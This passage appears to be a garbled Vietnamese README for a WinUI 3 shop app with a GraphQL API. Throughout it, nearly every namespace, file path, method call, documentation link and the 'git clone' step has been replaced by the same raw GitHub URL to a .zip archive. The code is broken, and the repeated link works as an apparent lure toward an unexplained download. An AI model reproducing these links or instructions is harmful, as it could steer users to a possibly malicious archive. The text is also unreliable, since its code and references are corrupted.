}
```

#### 3?? Query qua GraphQL
```graphql
query {
  products {
    id
    name
    extensionData
  }
}
```

Response:
```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Smartphone X",
        "extensionData": "{\"Screen\":\"OLED\",\"Battery\":\"5000mAh\"}"
      }
    ]
  }
}
```

### **L?i ích**

? **No schema migration needed** - Không c?n alter table khi thêm field m?i  
? **Flexible** - M?i product có th? có properties khác nhau  
? **Plugin-friendly** - Plugin có th? thêm data riêng không ?nh h??ng core  
? **Backward compatible** - Data c? v?n ho?t ??ng bình th??ng  

### **Use Cases**

1. **E-commerce variants**: Size, Color, Material cho t?ng lo?i s?n ph?m
2. **Custom attributes**: Thu?c tính riêng c?a t?ng category
3. **Plugin metadata**: Data t? plugin bên th? 3
4. **Dynamic forms**: Form fields ??ng t? admin config

---

## ????? H??NG D?N PHÁT TRI?N

### **1. T?o View và ViewModel m?i**

#### B??c 1: T?o ViewModel

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;

namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
{
    public partial class NewFeatureViewModel : ObservableObject
    {
        [ObservableProperty]
        private string _title = "New Feature";

        [RelayCommand]
        private void DoSomething()
        {
            // Logic here
        }
    }
}
```

#### B??c 2: T?o View

```xaml
<!-- File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip -->
<Page
    x:Class="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns:x="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns:vm="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip">
    
    <Grid>
        <TextBlock Text="{Binding Title}" />
        <Button Content="Do Something" Command="{Binding DoSomethingCommand}" />
    </Grid>
</Page>
```

#### B??c 3: Register trong DI

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
AppHost = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip()
    .ConfigureServices((context, services) =>
    {
        // ... existing services
        
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<NewFeatureView>();
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<NewFeatureViewModel>();
    })
    .Build();
```

### **2. G?i GraphQL API t? ViewModel**

```csharp
public partial class ProductsScreenViewModel : ObservableObject
{
    private readonly HttpClient _httpClient;

    public ProductsScreenViewModel()
    {
        _httpClient = new HttpClient { BaseAddress = new Uri("http://localhost:5000") };
    }

    [RelayCommand]
    private async Task LoadProductsAsync()
    {
        var query = new
        {
            query = @"
            {
              products {
                id
                name
                sku
                importPrice
                category {
                  name
                }
              }
            }"
        };

        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(query);
        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
        
        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<List<Product>>>(result);
        
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
        foreach (var product in https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
        {
            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
        }
    }
}

// Response model
public class GraphQLResponse<T>
{
    public T Data { get; set; }
}
```

### **3. Thêm Entity m?i**

#### B??c 1: T?o Entity

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;

namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
{
    [Table("customers")]
    public class Customer
    {
        [Key]
        [Column("customer_id")]
        public int Id { get; set; }

        [Required]
        [Column("name")]
        public string Name { get; set; }

        [Column("email")]
        public string Email { get; set; }

        // Plugin support
        [Column("extension_data", TypeName = "jsonb")]
        public string? ExtensionData { get; set; }
    }
}
```

#### B??c 2: Thêm vào DbContext

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
public class MyShopDbContext : DbContext
{
    // Existing DbSets...
    public DbSet<Customer> Customers { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(modelBuilder);
        
        // C?u hình cho Customer
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<Customer>()
            .Property(c => https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
            .IsRequired();
    }
}
```

#### B??c 3: T?o Migration (n?u dùng migrations)

```bash
cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
dotnet ef migrations add AddCustomerTable
dotnet ef database update
```

#### B??c 4: Thêm vào GraphQL Query

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
public class Query
{
    // Existing queries...
    
    [UseProjection]
    [UseFiltering]
    [UseSorting]
    public IQueryable<Customer> GetCustomers([Service] MyShopDbContext context) =>
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
}
```

### **4. Thêm Service m?i**

```csharp
// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
public interface ICustomerService
{
    Task<List<Customer>> GetAllCustomersAsync();
    Task<Customer> GetCustomerByIdAsync(int id);
    Task AddCustomerAsync(Customer customer);
}

// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
public class CustomerService : ICustomerService
{
    private readonly HttpClient _httpClient;

    public CustomerService()
    {
        _httpClient = new HttpClient { BaseAddress = new Uri("http://localhost:5000") };
    }

    public async Task<List<Customer>> GetAllCustomersAsync()
    {
        var query = new { query = "{ customers { id name email } }" };
        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(query);
        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
        
        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<List<Customer>>>(result);
        
        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
    }
    
    // Implement other methods...
}

// Register trong DI
https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ICustomerService, CustomerService>();
```

### **5. Debug và Troubleshooting**

#### Ki?m tra DI registration
```csharp
// Trong https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
var services = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
var viewModel = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenViewModel>();
if (viewModel == null)
{
    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("ViewModel not registered!");
}
```

#### Test GraphQL query
```powershell
# Test nhanh query
$query = '{"query":"{ products { id name } }"}'
Invoke-RestMethod -Uri http://localhost:5000/graphql -Method Post -Body $query -ContentType "application/json"
```

#### Ki?m tra database
```bash
# Xem tables
sqlite3 https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip ".tables"

# Xem data
sqlite3 https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip "SELECT * FROM products;"
```

---

## ?? TÀI LI?U THAM KH?O

### **Official Documentation**
- [WinUI 3 Documentation](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [.NET MAUI & WinUI](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [HotChocolate GraphQL](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [Entity Framework Core](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)

### **Tutorials**
- [Building WinUI 3 Apps](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [GraphQL Best Practices](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
- [Clean Architecture in .NET](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)

---

## ? FAQ

### **Q: Làm sao ?? thay ??i database t? SQLite sang PostgreSQL?**
A: Thay ??i trong `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` c?a API:
```csharp
// Thay vì UseSqlite
https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MyShopDbContext>(options =>
    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("Host=localhost;Database=myshop;Username=user;Password=pass"));
```

### **Q: Làm sao ?? thêm Authentication?**
A: Thêm vào API:
```csharp
https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
    .AddAuthentication()
    .AddJwtBearer();

https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
    .AddGraphQLServer()
    .AddAuthorization();
```

### **Q: App không build ???c do l?i Platform?**
A: Ch? ??nh platform khi build:
```bash
dotnet build /p:Platform=x64
```

### **Q: GraphQL không tr? v? data?**
A: Ki?m tra:
1. API có ?ang ch?y không?
2. Database có data không?
3. Query syntax ?úng ch?a?
4. Xem logs trong console API

---

## ?? LICENSE

MIT License - Free to use and modify.

---

## ?? CONTRIBUTORS

D? án ???c phát tri?n b?i team MyShop.

---

## ?? GETTING STARTED QUICK

```bash
# 1. Clone repo
git clone https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
cd my-shop

# 2. Start API
cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
dotnet run

# 3. Trong terminal khác, test API
curl -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ products { name } }"}'

# 4. Build và ch?y App
cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
dotnet build /p:Platform=x64
```

**Enjoy coding! ??**